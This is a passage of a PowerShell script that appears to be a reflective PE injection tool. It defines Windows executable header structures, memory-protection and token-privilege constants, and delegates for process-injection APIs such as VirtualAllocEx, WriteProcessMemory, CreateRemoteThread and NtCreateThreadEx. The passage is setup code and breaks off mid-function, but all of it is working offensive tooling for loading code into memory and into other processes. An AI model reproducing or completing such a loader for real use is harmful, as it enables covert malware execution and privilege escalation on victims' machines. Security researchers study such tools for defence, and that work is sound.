		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress 
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
